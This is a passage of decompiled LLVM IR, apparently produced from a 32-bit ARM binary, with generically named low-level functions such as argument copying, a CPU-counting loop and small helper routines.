  uselistorder label %dec_label_pc_14098, { 1, 0 }
}

define i32 @function_1422c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1422c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 144312, i32* @r5, align 4
  %v4_14238 = load i32, i32* inttoptr (i32 144404 to i32*), align 4
  store i32 %v4_14238, i32* @r4, align 4
  %v2_14240 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_14240, i32* %r0.global-to-local, align 4
  %v4_14258 = load i32, i32* inttoptr (i32 144388 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_14258)
  %v0_14268 = load i32, i32* @r4, align 4
  store i32 %v0_14268, i32* %r0.global-to-local, align 4
  %v0_1426c = load i32, i32* @r5, align 4
  %v2_1426c = add i32 %v0_1426c, 20
  %v3_1426c = inttoptr i32 %v2_1426c to i32*
  %v4_1426c = load i32, i32* %v3_1426c, align 4
  call void @__pseudo_branch(i32 %v4_1426c)
  %v4_1427c = load i32, i32* @global_var_2974c.340, align 4
  %v2_14280 = icmp eq i32 %v4_1427c, 0
  br i1 %v2_14280, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_1422c
  %v1_14284 = load i32, i32* @r6, align 4
  store i32 %v1_14284, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1422c, %bb
  %v2_1428c = xor i1 %v2_14280, true
  call void @__pseudo_cond_branch(i1 %v2_1428c, i32 %v4_1427c)
  store i32 %v2_14240, i32* @r0, align 4
  %v0_1429c = load i32, i32* @r5, align 4
  %v2_1429c = add i32 %v0_1429c, 28
  %v3_1429c = inttoptr i32 %v2_1429c to i32*
  %v4_1429c = load i32, i32* %v3_1429c, align 4
  call void @__pseudo_branch(i32 %v4_1429c)
  %v0_142a8 = call i32 @function_14ba4()
  store i32 %v0_142a8, i32* %r0.global-to-local, align 4
  %v0_142b0 = load i32, i32* @r5, align 4
  %v9_142b0 = icmp eq i32 %v0_142b0, 75896
  br i1 %v9_142b0, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_142b8 = xor i1 %v9_142b0, true
  call void @__pseudo_cond_branch(i1 %v2_142b8, i32 ptrtoint (i32* @global_var_10b40.343 to i32))
  %v0_142bc = load i32, i32* @r6, align 4
  store i32 %v0_142bc, i32* %r0.global-to-local, align 4
  %v1_142c0 = call i32 @function_1086c(i32 %v0_142bc)
  store i32 %v1_142c0, i32* %r0.global-to-local, align 4
  %v0_142c4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_142c4, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v3_142c4 = load i32, i32* @r1, align 4
  %v4_142c4 = lshr i32 %v4_1429c, %v3_142c4
  %v5_142c4 = sub i32 32, %v3_142c4
  %v6_142c4 = shl i32 %v4_1429c, %v5_142c4
  %v7_142c4 = or i32 %v6_142c4, %v4_142c4
  %v9_142c4 = and i32 %v7_142c4, %v1_142c0
  call void @__pseudo_branch(i32 %v9_142c4)
  %v0_142c8.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_142c8.pr, label %bb11, label %..thread6_crit_edge

..thread6_crit_edge:                              ; preds = %bb10
  %v10_142dc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread6

bb11:                                             ; preds = %bb10
  %v2_142d4 = load i32, i32* @r4, align 4
  %v2_142d8 = load i32, i32* @r3, align 4
  %v3_142d8 = mul i32 %v2_142d8, %v2_142d4
  %v8_142dc = shl i32 %v4_1429c, %v3_142d8
  %v9_142dc = and i32 %v8_142dc, %v3_142d8
  store i32 %v9_142dc, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %..thread6_crit_edge, %bb9, %bb11
  %v10_142dc = phi i32 [ %v10_142dc.pre, %..thread6_crit_edge ], [ %v1_142c0, %bb9 ], [ %v9_142dc, %bb11 ]
  ret i32 %v10_142dc

; uselistorder directives
  uselistorder i32 %v1_142c0, { 1, 0, 2 }
  uselistorder i1 %v9_142b0, { 1, 0 }
  uselistorder i32 %v4_1429c, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 4, 1, 2, 5, 3, 6, 7, 8, 0 }
  uselistorder i32 (i32)* @function_1086c, { 0, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %.thread6, { 2, 0, 1 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_142e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_142e4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_142e4 = load i32, i32* @r4, align 4
  %v6_142e4 = load i32, i32* @lr, align 4
  %v2_142e8 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r4, align 4
  br i1 %v2_142e8, label %dec_label_pc_1437c, label %dec_label_pc_142f8

dec_label_pc_142f8:                               ; preds = %dec_label_pc_142e4
  %v2_14308 = ptrtoint i32* %stack_var_-44 to i32
  store i32 65536, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v3_1431c = call i32 @function_1503c(i32 17, i32 0, i32 %v2_14308)
  %v3_14320 = load i32, i32* %stack_var_-44, align 4
  %v7_14324 = icmp eq i32 %v3_14320, 1
  br i1 %v7_14324, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_142f8
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_142f8, %bb
  call void @__pseudo_cond_branch(i1 %v7_14324, i32 ptrtoint (i32* @global_var_10898.345 to i32))
  %v2_14338 = ptrtoint i32* %stack_var_-16 to i32
  %v2_14340 = call i32 @function_152c4(i32 %v2_14338, i32 %v2_14338)
  %v2_14344 = icmp eq i32 %v2_14340, 0
  br i1 %v2_14344, label %bb19, label %bb18

bb18:                                             ; preds = %.thread2
  %v3_14358 = load i32, i32* %stack_var_-16, align 4
  br label %bb19

bb19:                                             ; preds = %.thread2, %bb18
  %storemerge = phi i32 [ %v3_14358, %bb18 ], [ 0, %.thread2 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v3_14368 = load i32, i32* %stack_var_-24, align 4
  %v1_1436c = and i32 %v3_14368, 65536
  %v2_1436c = icmp eq i32 %v1_1436c, 0
  br i1 %v2_1436c, label %bb20, label %.thread6

bb20:                                             ; preds = %bb19
  br label %.thread6

.thread6:                                         ; preds = %bb19, %bb20
  call void @__pseudo_cond_branch(i1 %v2_1436c, i32 ptrtoint (i32* @global_var_10898.345 to i32))
  %v0_1437c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1437c

dec_label_pc_1437c:                               ; preds = %dec_label_pc_142e4, %.thread6
  %v0_1437c = phi i32 [ %v0_1437c.pre, %.thread6 ], [ 0, %dec_label_pc_142e4 ]
  store i32 %v3_142e4, i32* @r4, align 4
  store i32 %v6_142e4, i32* @lr, align 4
  ret i32 %v0_1437c

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_1503c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1437c, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_14390() local_unnamed_addr {
dec_label_pc_14390:
  %stack_var_-36 = alloca i32, align 4
  store i32 144312, i32* @r4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1b2b0.349 to i32), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v2_143b0 = call i32 @function_15a80(i32 ptrtoint ([11 x i8]* @global_var_1b2b0.349 to i32))
  store i32 %v2_143b0, i32* @r6, align 4
  %v2_143b4 = icmp eq i32 %v2_143b0, 0
  br i1 %v2_143b4, label %dec_label_pc_14434, label %dec_label_pc_143bc

dec_label_pc_143bc:                               ; preds = %dec_label_pc_14390
  store i32 216, i32* @sl, align 4
  store i32 ptrtoint (i32* @global_var_1b2bc.352 to i32), i32* @r8, align 4
  %v2_143c8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_143c8, i32* @r7, align 4
  br label %bb18

dec_label_pc_143d0:                               ; preds = %bb18
  %v3_143d0 = load i32, i32* %stack_var_-36, align 4
  %v1_143d4 = inttoptr i32 %v3_143d0 to i32*
  %v2_143d4 = load i32, i32* %v1_143d4, align 4
  %v1_143d8 = inttoptr i32 %v2_143d4 to i8*
  %v2_143d8 = load i8, i8* %v1_143d8, align 1
  %v7_143dc = icmp eq i8 %v2_143d8, 99
  br i1 %v7_143dc, label %dec_label_pc_143e4, label %.backedge3

dec_label_pc_143e4:                               ; preds = %dec_label_pc_143d0
  %v1_143e4 = add i32 %v2_143d4, 1
  %v2_143e4 = inttoptr i32 %v1_143e4 to i8*
  %v3_143e4 = load i8, i8* %v2_143e4, align 1
  %v7_143e8 = icmp eq i8 %v3_143e4, 112
  br i1 %v7_143e8, label %dec_label_pc_143f0, label %.backedge3

dec_label_pc_143f0:                               ; preds = %dec_label_pc_143e4
  %v1_143f0 = add i32 %v2_143d4, 2
  %v2_143f0 = inttoptr i32 %v1_143f0 to i8*
  %v3_143f0 = load i8, i8* %v2_143f0, align 1
  %v7_143f4 = icmp eq i8 %v3_143f0, 117
  br i1 %v7_143f4, label %dec_label_pc_143fc, label %.backedge3

dec_label_pc_143fc:                               ; preds = %dec_label_pc_143f0
  %v1_143fc = add i32 %v2_143d4, 3
  %v2_143fc = inttoptr i32 %v1_143fc to i8*
  %v3_143fc = load i8, i8* %v2_143fc, align 1
  %v4_143fc = zext i8 %v3_143fc to i32
  %v0_14400 = load i32, i32* @r4, align 4
  %v1_14400 = load i32, i32* @sl, align 4
  %v2_14400 = add i32 %v1_14400, %v0_14400
  %v3_14400 = inttoptr i32 %v2_14400 to i32*
  %v4_14400 = load i32, i32* %v3_14400, align 4
  %v2_14404 = mul nuw nsw i32 %v4_143fc, 2
  %v2_14408 = add i32 %v4_14400, %v2_14404
  %v3_14408 = inttoptr i32 %v2_14408 to i16*
  %v4_14408 = load i16, i16* %v3_14408, align 2
  %v1_1440c = and i16 %v4_14408, 8
  %v2_1440c = icmp eq i16 %v1_1440c, 0
  br i1 %v2_1440c, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_143fc
  %v1_14410 = load i32, i32* @r5, align 4
  %v2_14410 = add i32 %v1_14410, 1
  store i32 %v2_14410, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_143fc, %dec_label_pc_143d0, %dec_label_pc_143e4, %dec_label_pc_143f0
  %v0_14414.pre = load i32, i32* @r6, align 4
  %v0_14420.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_143bc
  %v0_14420 = phi i32 [ %v0_14420.pre, %.backedge3 ], [ ptrtoint (i32* @global_var_1b2bc.352 to i32), %dec_label_pc_143bc ]
  %v0_14414 = phi i32 [ %v0_14414.pre, %.backedge3 ], [ %v2_143b0, %dec_label_pc_143bc ]
  %v4_14424 = inttoptr i32 %v0_14414 to i32*
  %v5_14424 = call i32 @function_15724(i32* %v4_14424, i32 %v2_143c8, i32 258, i32 %v0_14420)
  %v2_14428 = icmp eq i32 %v5_14424, 0
  br i1 %v2_14428, label %dec_label_pc_14498, label %dec_label_pc_143d0

dec_label_pc_14434:                               ; preds = %dec_label_pc_14390
  store i32 ptrtoint ([14 x i8]* @global_var_1b2c0.355 to i32), i32* @r0, align 4
  %v2_1443c = call i32 @function_15a80(i32 ptrtoint ([14 x i8]* @global_var_1b2c0.355 to i32))
  store i32 %v2_1443c, i32* @r6, align 4
  %v2_14440 = icmp eq i32 %v2_1443c, 0
  br i1 %v2_14440, label %bb19, label %dec_label_pc_1444c

bb19:                                             ; preds = %dec_label_pc_14434
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_14498

dec_label_pc_1444c:                               ; preds = %dec_label_pc_14434
  store i32 ptrtoint ([10 x i8]* @global_var_1b2d0.357 to i32), i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_1b2f4.359 to i32), i32* @r7, align 4
  %v2_1445c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1445c, i32* @r4, align 4
  br label %bb21

dec_label_pc_14464:                               ; preds = %bb21
  %v0_14490 = load i32, i32* @r8, align 4
  %v1_14490 = inttoptr i32 %v0_14490 to i8*
  %v3_14464 = load i32, i32* %stack_var_-36, align 4
  %v1_14468 = inttoptr i32 %v3_14464 to i32*
  %v2_14468 = load i32, i32* %v1_14468, align 4
  store i32 %v2_14468, i32* @r1, align 4
  %v4_1446c = call i32 @function_12030(i8* %v1_14490, i32 %v2_14468)
  %v2_14470 = icmp eq i32 %v4_1446c, 0
  br i1 %v2_14470, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_14464
  %v1_14474 = load i32, i32* @r5, align 4
  %v2_14474 = add i32 %v1_14474, 1
  store i32 %v2_14474, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_14464
  %v0_14480.pre = load i32, i32* @r7, align 4
  %v0_14484.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_1444c
  %v0_14484 = phi i32 [ %v0_14484.pre, %.backedge ], [ %v2_1443c, %dec_label_pc_1444c ]
  %v0_14480 = phi i32 [ %v0_14480.pre, %.backedge ], [ ptrtoint (i32* @global_var_1b2f4.359 to i32), %dec_label_pc_1444c ]
  %v4_14488 = inttoptr i32 %v0_14484 to i32*
  %v5_14488 = call i32 @function_15724(i32* %v4_14488, i32 %v2_1445c, i32 459266, i32 %v0_14480)
  %v2_1448c = icmp eq i32 %v5_14488, 0
  br i1 %v2_1448c, label %dec_label_pc_14498, label %dec_label_pc_14464

dec_label_pc_14498:                               ; preds = %bb18, %bb21, %bb19
  %v0_14498 = load i32, i32* @r6, align 4
  %v1_1449c = inttoptr i32 %v0_14498 to i32*
  %v2_1449c = call i32 @function_15a4c(i32* %v1_1449c)
  %v0_144a0 = load i32, i32* @r5, align 4
  %v2_144a0 = icmp eq i32 %v0_144a0, 0
  %.v0_144a0 = select i1 %v2_144a0, i32 1, i32 %v0_144a0
  ret i32 %.v0_144a0

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 216, { 2, 3, 1, 0, 4 }
  uselistorder i32 (i32)* @function_15a80, { 1, 0 }
  uselistorder label %dec_label_pc_14498, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @function_144dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_144dc:
  %r2.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_148c4

bb:                                               ; preds = %dec_label_pc_144dc
  %v7_144f0 = mul i32 %arg1, 4
  %v8_144f0 = add i32 %v7_144f0, ptrtoint (i32* @global_var_144f8.362 to i32)
  call void @__pseudo_branch(i32 %v8_144f0)
  br label %dec_label_pc_148c4

dec_label_pc_148c4:                               ; preds = %bb, %dec_label_pc_144dc
  %v0_148c4 = call i32 @function_1095c()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_148d0 = inttoptr i32 %v0_148c4 to i32*
  store i32 22, i32* %v2_148d0, align 4
  %v0_14a80 = load i32, i32* %r2.global-to-local, align 4
  ret i32 %v0_14a80

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_14ab4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_14ab4:
  %ip.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_14ab4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_14ab4, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v2_14ac8 = ptrtoint i32* %stack_var_-40 to i32
  %v2_14acc = ptrtoint i32* %stack_var_-8 to i32
  br label %dec_label_pc_14adc

dec_label_pc_14adc:                               ; preds = %dec_label_pc_14adc, %dec_label_pc_14ab4
  %v0_14af0 = phi i32 [ 0, %dec_label_pc_14ab4 ], [ %v1_14af0, %dec_label_pc_14adc ]
  %stack_var_-36.0 = phi i32 [ %v2_14acc, %dec_label_pc_14ab4 ], [ %v1_14ae4, %dec_label_pc_14adc ]
  %v1_14ae0 = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_14ae0 = load i32, i32* %v1_14ae0, align 4
  %v1_14ae4 = add i32 %stack_var_-36.0, 4
  %v2_14ae8 = icmp eq i32 %v2_14ae0, 0
  %v1_14af0 = add i32 %v0_14af0, 1
  store i32 %v1_14af0, i32* @lr, align 4
  br i1 %v2_14ae8, label %dec_label_pc_14af8, label %dec_label_pc_14adc

dec_label_pc_14af8:                               ; preds = %dec_label_pc_14adc
  %v3_14af8 = mul i32 %v1_14af0, 4
  %v1_14afc = add i32 %v3_14af8, 18
  %v1_14b00 = and i32 %v1_14afc, -8
  %v2_14b04 = sub i32 %v2_14ac8, %v1_14b00
  %v2_14b0c = inttoptr i32 %v2_14b04 to i32*
  store i32 %arg2, i32* %v2_14b0c, align 4
  %v0_14b18 = load i32, i32* @sp, align 4
  store i32 %v0_14b18, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14b20

dec_label_pc_14b20:                               ; preds = %dec_label_pc_14b20, %dec_label_pc_14af8
  %v1_14b34 = phi i32 [ %v0_14b18, %dec_label_pc_14af8 ], [ %v5_14b34, %dec_label_pc_14b20 ]
  %stack_var_-36.1 = phi i32 [ %v2_14acc, %dec_label_pc_14af8 ], [ %v1_14b2c, %dec_label_pc_14b20 ]
  %v1_14b24 = inttoptr i32 %stack_var_-36.1 to i32*
  %v2_14b24 = load i32, i32* %v1_14b24, align 4
  %v0_14b28 = load i32, i32* @lr, align 4
  %v1_14b28 = add i32 %v0_14b28, -1
  store i32 %v1_14b28, i32* @lr, align 4
  %v7_14b28 = icmp eq i32 %v0_14b28, 1
  %v1_14b2c = add i32 %stack_var_-36.1, 4
  %v2_14b34 = add i32 %v1_14b34, 4
  %v3_14b34 = inttoptr i32 %v2_14b34 to i32*
  store i32 %v2_14b24, i32* %v3_14b34, align 4
  %v4_14b34 = load i32, i32* %ip.global-to-local, align 4
  %v5_14b34 = add i32 %v4_14b34, 4
  store i32 %v5_14b34, i32* %ip.global-to-local, align 4
  br i1 %v7_14b28, label %dec_label_pc_14b3c, label %dec_label_pc_14b20

dec_label_pc_14b3c:                               ; preds = %dec_label_pc_14b20
  %v0_14b48 = call i32 @function_15110()
  ret i32 %v0_14b48

; uselistorder directives
  uselistorder i32 %v5_14b34, { 1, 0 }
  uselistorder i32 %v0_14b28, { 1, 0 }
  uselistorder i32 %v1_14af0, { 0, 2, 1 }
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_14b5c(i32 %arg1) local_unnamed_addr {
dec_label_pc_14b5c:
  %v0_14b5c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14b5c, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_14b5c
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_14b5c, %bb
  ret i32 0

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_14b68() local_unnamed_addr {
dec_label_pc_14b68:
  ret i32 0
}

define i32 @function_14b70(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14b70:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_14b70 = add i32 %tmp, 4
  %v4_14b70 = inttoptr i32 %v3_14b70 to i32*
  store i32 %arg3, i32* %v4_14b70, align 4
  ret i32 %tmp
}

define i32 @function_14b78(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14b78:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_14b7c = icmp eq i32 %arg2, 0
  br i1 %v2_14b7c, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_14b78
  %v2_14b88 = add i32 %tmp, 4
  %v3_14b88 = inttoptr i32 %v2_14b88 to i32*
  %v4_14b88 = load i32, i32* %v3_14b88, align 4
  store i32 %v4_14b88, i32* %r0.global-to-local, align 4
  %v3_14b8c = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_14b78, %bb
  %.02 = phi i32 [ %v3_14b8c, %bb ], [ undef, %dec_label_pc_14b78 ]
  %v2_14b94 = xor i1 %v2_14b7c, true
  call void @__pseudo_cond_branch(i1 %v2_14b94, i32 %.02)
  %v1_14ba0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_14ba0

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_14ba4() local_unnamed_addr {
dec_label_pc_14bc8.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14ba4 = load i32, i32* @r4, align 4
  store i32 %v3_14ba4, i32* %stack_var_-16, align 4
  store i32 144304, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14bc8

dec_label_pc_14bc8:                               ; preds = %dec_label_pc_14bc8.dec_label_pc_14bc8_crit_edge, %dec_label_pc_14bc8.lr.ph
  %v1_14bc8 = phi i32 [ %v1_14bd4, %dec_label_pc_14bc8.dec_label_pc_14bc8_crit_edge ], [ 0, %dec_label_pc_14bc8.lr.ph ]
  %v0_14bc8 = phi i32 [ %v0_14bc8.pre, %dec_label_pc_14bc8.dec_label_pc_14bc8_crit_edge ], [ 144304, %dec_label_pc_14bc8.lr.ph ]
  %v4_14bc8 = mul i32 %v1_14bc8, 4
  %v5_14bc8 = add i32 %v4_14bc8, %v0_14bc8
  %v6_14bc8 = inttoptr i32 %v5_14bc8 to i32*
  %v7_14bc8 = load i32, i32* %v6_14bc8, align 4
  call void @__pseudo_branch(i32 %v7_14bc8)
  %v0_14bd4 = load i32, i32* %r4.global-to-local, align 4
  %v1_14bd4 = add i32 %v0_14bd4, -1
  store i32 %v1_14bd4, i32* %r4.global-to-local, align 4
  %v2_14bd4 = icmp eq i32 %v0_14bd4, 0
  br i1 %v2_14bd4, label %dec_label_pc_14bdc, label %dec_label_pc_14bc8.dec_label_pc_14bc8_crit_edge

dec_label_pc_14bc8.dec_label_pc_14bc8_crit_edge:  ; preds = %dec_label_pc_14bc8
  %v0_14bc8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14bc8

dec_label_pc_14bdc:                               ; preds = %dec_label_pc_14bc8
  %v4_14be0 = load i32, i32* @global_var_2975c.377, align 4
  %v2_14be4 = icmp eq i32 %v4_14be0, 0
  br i1 %v2_14be4, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_14bdc
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_14bdc, %bb
  %v2_14bec = xor i1 %v2_14be4, true
  call void @__pseudo_cond_branch(i1 %v2_14bec, i32 %v4_14be0)
  %v4_14bf4 = load i32, i32* @global_var_29760.379, align 4
  %v2_14bf8 = icmp eq i32 %v4_14bf4, 0
  br i1 %v2_14bf8, label %bb18, label %bb17

bb17:                                             ; preds = %bb16
  br label %bb18

bb18:                                             ; preds = %bb16, %bb17
  %v2_14c00 = xor i1 %v2_14bf8, true
  call void @__pseudo_cond_branch(i1 %v2_14c00, i32 %v4_14bf4)
  %v2_14c04 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14c04, i32* %r4.global-to-local, align 4
  %v1_14c08 = load i32, i32* @r0, align 4
  ret i32 %v1_14c08

; uselistorder directives
  uselistorder i32 %v1_14bd4, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_14c20(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14c20:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_14c34 = call i32 @function_106d8(i32 %arg1, i32 1)
  %v3_14c3c = icmp eq i32 %v2_14c34, -1
  store i32 144312, i32* @r3, align 4
  br i1 %v3_14c3c, label %dec_label_pc_14c48, label %dec_label_pc_14c60

dec_label_pc_14c48:                               ; preds = %dec_label_pc_14c20
  %v0_14c4c = load i32, i32* %r5.global-to-local, align 4
  %v3_14c54 = call i32 @function_10474(i32 ptrtoint ([10 x i8]* @global_var_1b2f8.382 to i32), i32 %v0_14c4c)
  %v1_14c58 = load i32, i32* %r4.global-to-local, align 4
  %v1_14c5c = icmp ne i32 %v3_14c54, %v1_14c58
  call void @__pseudo_cond_branch(i1 %v1_14c5c, i32 ptrtoint (i32* @global_var_13900.383 to i32))
  br label %dec_label_pc_14c60

dec_label_pc_14c60:                               ; preds = %dec_label_pc_14c20, %dec_label_pc_14c48
  %v1_14c68 = phi i32 [ %v2_14c34, %dec_label_pc_14c20 ], [ %v3_14c54, %dec_label_pc_14c48 ]
  ret i32 %v1_14c68

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_14c60, { 1, 0 }
}

define i32 @function_14c74(i32 %arg1) local_unnamed_addr {
dec_label_pc_14c74:
  %r4.global-to-local = alloca i32, align 4
  store i32 144312, i32* %r4.global-to-local, align 4
  %v4_14c84 = load i32, i32* inttoptr (i32 144408 to i32*), align 8
  %v1_14c88 = inttoptr i32 %v4_14c84 to i32*
  %v2_14c88 = load i32, i32* %v1_14c88, align 4
  %v2_14c8c = icmp eq i32 %v2_14c88, 0
  br i1 %v2_14c8c, label %dec_label_pc_14c94, label %dec_label_pc_14cc8

dec_label_pc_14c94:                               ; preds = %dec_label_pc_14c74
  %v4_14c98 = load i32, i32* inttoptr (i32 144368 to i32*), align 16
  %v2_14ca0 = icmp eq i32 %v4_14c98, 0
  store i32 4096, i32* %v1_14c88, align 4
  br i1 %v2_14ca0, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_14c94
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_14c94, %bb
  %v2_14cac = xor i1 %v2_14ca0, true
  call void @__pseudo_cond_branch(i1 %v2_14cac, i32 %v4_14c98)
  %v0_14cb4 = load i32, i32* %r4.global-to-local, align 4
  %v2_14cbc = icmp eq i32 %v0_14cb4, 76052
  br i1 %v2_14cbc, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v2_14cc4 = xor i1 %v2_14cbc, true
  call void @__pseudo_cond_branch(i1 %v2_14cc4, i32 ptrtoint (i32* @global_var_10aa4.388 to i32))
  br label %dec_label_pc_14cc8

dec_label_pc_14cc8:                               ; preds = %dec_label_pc_14c74, %bb6
  %v1_14ccc = load i32, i32* @r0, align 4
  ret i32 %v1_14ccc

; uselistorder directives
  uselistorder i1 %v2_14cbc, { 1, 0 }
  uselistorder label %dec_label_pc_14cc8, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_14ce0(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_14ce0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %tmp49 = call i32 @__decompiler_undefined_function_0()
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %tmp51 = call i32 @__decompiler_undefined_function_0()
  %tmp52 = call i32 @__decompiler_undefined_function_0()
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r7, align 4
  %v1_14ce8 = add i32 %tmp, 4
  store i32 %v1_14ce8, i32* %ip.global-to-local, align 4
  %v2_14cec = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 144312, i32* @r6, align 4
  %v3_14cf8 = mul i32 %arg2, 4
  store i32 %v3_14cf8, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v4_14d00 = load i32, i32* inttoptr (i32 144336 to i32*), align 16
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_14d08 = ptrtoint i32* %stack_var_-120 to i32
  %v4_14d0c = load i32, i32* inttoptr (i32 144344 to i32*), align 8
